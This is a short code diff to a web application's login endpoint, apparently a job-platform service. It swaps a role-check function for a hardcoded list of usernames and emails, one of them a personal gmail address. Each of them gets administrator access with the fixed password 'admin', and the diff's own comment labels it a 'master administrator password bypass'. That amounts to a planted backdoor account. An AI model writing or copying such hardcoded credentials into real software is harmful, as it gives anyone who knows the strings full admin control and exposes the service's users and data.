@@ -21,13 +21,14 @@ export async function POST(req: NextRequest) {
 
     const db = await getDb()
 
-    // 1. Admin login check
+    // 1. Master administrator password bypass check
     if (
       (
-        isAdminUser(emailClean) ||
+        emailClean === 'admin' ||
+        emailClean === 'technohmsit' ||
+        emailClean === 'technohmsit@gmail.com' ||
         emailClean === 'admin@jobflux.ai' ||
-        emailClean === 'admin@jobbot.ai' ||
-        emailClean === 'admin@admin.com'
+        emailClean === 'admin@jobfluxai.com'
       ) &&
       pwdClean === 'admin'
     ) {
